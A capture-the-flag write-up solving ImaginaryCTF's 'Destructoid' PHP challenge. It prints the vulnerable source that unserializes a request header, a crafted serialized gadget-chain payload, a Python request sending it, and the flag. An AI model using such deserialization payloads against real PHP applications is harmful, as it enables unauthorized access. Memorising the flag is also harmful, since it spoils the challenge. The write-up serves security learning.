# Destructoid

## Task

[Destructoid](https://destructoid.chal.imaginaryctf.org)

## Solution

We are greeted by a string `ecruos? ym dnif uoy naC`.
If we reverse it (Or read backwards) we might be able
to guess that it wants us to add the get parameter
of `?source` and in fact that gets us the source:

```php
$printflag = false;

class X {
    function __construct($cleanup) {
        if ($cleanup === "flag") {
            die("NO!\n");
        }
        $this->cleanup = $cleanup;
    }

    function __toString() {
        return $this->cleanup;
    }

    function __destruct() {
        global $printflag;
        if ($this->cleanup !== "flag" && $this->cleanup !== "noflag") {
            die("No!\n");
        }
        include $this->cleanup . ".php";
        if ($printflag) {
            echo $FLAG . "\n";
        }
    }
}

class Y {
    function __wakeup() {
        echo $this->secret . "\n";
    }

    function __toString() {
        global $printflag;
        $printflag = true;
        return (new X($this->secret))->cleanup;
    }
}

if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}
echo "ecruos? ym dnif uoy naC\n";
if (isset($_SERVER['HTTP_X_PAYLOAD'])) {
    unserialize(base64_decode($_SERVER['HTTP_X_PAYLOAD']));
}
```

We see some unserialization on the X-Payload header in the request,
so we need to first call `Y.__tostring` such that printflag is set,
but we also need to create an X object without going through the
`__construct` method, because else the rendering would stop and
we wouldn't get our flag.

So I copied the source onto my php server and played around a bit
by serializing an array of X and Y objects.

Finally I got this:

```php
$y = new Y("flag");
$x = New X("flag");

echo serialize([$y, new Y($y), $x]);
```

The idea is to create a y object, then pass it to the Y wakup function
(Which is called after unserializing) which converts the y object to a
string (Because of the string concatenation). Then we create an X object
with the secret "flag" to get the contents of the flag.php file.

`a:3:{i:0;O:1:"Y":1:{s:6:"secret";s:4:"flag";}i:1;O:1:"Y":1:{s:6:"secret";r:2;}i:2;O:1:"X":1:{s:7:"cleanup";s:4:"flag";}}`

We can then use that in python to get the flag:

`get("https://destructoid.chal.imaginaryctf.org/",headers={"X-Payload":b64encode(b'a:3:{i:0;O:1:"Y":1:{s:6:"secret";s:4:"flag";}i:1;O:1:"Y":1:{s:6:"secret";r:2;}i:2;O:1:"X":1:{s:7:"cleanup";s:4:"flag";}}')}).text`

which prints the flag:


`ictf{d3s3r14l1z4t10n_4nd_d3struct10n}`
